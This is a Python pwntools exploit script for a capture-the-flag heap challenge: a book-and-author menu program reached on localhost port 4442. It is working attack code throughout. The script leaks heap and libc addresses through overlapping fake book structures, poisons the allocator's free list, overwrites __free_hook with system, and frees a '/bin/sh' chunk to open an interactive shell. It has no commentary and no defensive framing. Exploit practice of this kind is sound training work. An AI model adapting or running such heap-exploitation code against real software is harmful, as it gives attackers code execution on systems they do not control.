
from pwn import *

context.arch = "amd64"
context.terminal = "tmux splitw -h".split()
#p = process("./chall")
p = remote("localhost", 4442)
libc = ELF("./libc.so.6", checksec=False)
#context.log_level = "debug"

cmd = ""
DEBUG = 0
if DEBUG:
    gdb.attach(p, cmd, gdb_args=["--init-eval-command='source ~/ctf/tools/gef/gef.py'"]);

def goto(n):
	p.sendlineafter("> ", str(n))
	return

def create_author(idx, name_length, name):
	goto(1)
	p.sendlineafter(": ", str(idx))
	p.sendlineafter(": ", str(name_length))
	p.sendlineafter(": ", str(name))
	return

def edit_author(idx, name_length, name):
	goto(2)
	p.sendlineafter(": ", str(idx))
	p.sendlineafter(": ", str(name_length))
	if name:
		p.sendlineafter(": ", str(name))

def del_author(idx):
	goto(3)
	p.sendlineafter(": ", str(idx))
	return

def create_book(idx, author_idx, title, page, desc_len, desc):
	goto(4)
	p.sendlineafter(": ", str(idx))
	p.sendlineafter(": ", str(author_idx))
	p.sendlineafter(": ", title)
	p.sendlineafter(": ", str(page))
	p.sendlineafter(": ", str(desc_len))
	if desc:
		p.sendlineafter(": ", desc)
	return

def edit_book(idx, title, page, desc_len, desc):
	goto(5)
	p.sendlineafter(": ", str(idx))
	p.sendlineafter(": ", title)
	p.sendlineafter(": ", str(page))
	p.sendlineafter(": ", str(desc_len))
	p.sendlineafter(": ", desc)
	return

def print_book(idx):
	goto(6)
	p.sendlineafter(": ", str(idx))
	return

def del_book(idx):
	goto(7)
	p.sendlineafter(": ", str(idx))
	return

create_author(0, 5, "BBBB")
create_author(1, 5, "CCCC")
create_author(2, 5, "CCCC")
for i in range(256):
	create_book(str(i), 0, "titleBBBB"+str(i), 200, 100, "descCCC"+str(i))
edit_author(0, 0, '')
del_book(0)
create_book(300, 1, "titleDDDD", 1, 200, "descDDDD")
create_book(301, 1, "titleDDDD", 1, 0x30, p16(0x1)+b"A"*20)
del_author(2)
del_book(1)
print_book(301)
p.recvuntil("description : ")
heap_leak = u64(p.recvuntil("\n", drop=True).ljust(8, b"\x00"))
print(hex(heap_leak))

create_book(303, 1, "libc leak", 1, 0x500, 'b')
create_book(304, 1, "libc leak", 1, 0x300, "A"*8)
del_book(301)
del_book(303)
create_book(305, 1, "hacking", 1, 0x30, "C"*20)

fake_book = p32(0x2121) + b"A"*24 + p32(0) + p64(heap_leak+45392) + p64(heap_leak)
create_book(306, 1, "hacking", 1, 0x30, fake_book)
print_book(304)

p.recvuntil("description : ")
libc_leak = u64(p.recvuntil("\n", drop=True).ljust(8, b"\x00"))
print(hex(libc_leak))

libc_base = libc_leak - 2014176
print(hex(libc_base))

fake_chunk = p64(0) + p64(0) + p64(0x0) + p64(0x71) + p16(0x1)
create_book(303, 1, "libc leak", 1, 0x500, fake_chunk)

fake_book2 = p32(0x2121) + b"A"*24 + p32(0) + p64(0) + p64(heap_leak+45408+0x10) 
edit_book(306, "hacking", 1, 0x30, fake_book2)

del_book(304)

fake_chunk2 = p64(0) + p64(0) + p64(0x0) + p64(0x71) + p64(libc_base + libc.symbols['__free_hook'])
edit_book(303, "libc leak", 1, 0x500, fake_chunk2)

create_book(307, 1, "hacked", 1, 0x60, "/bin/sh")
create_book(308, 1, "hacked", 1, 0x60, p64(libc_base + libc.symbols['system']))

del_book(307)

p.interactive()
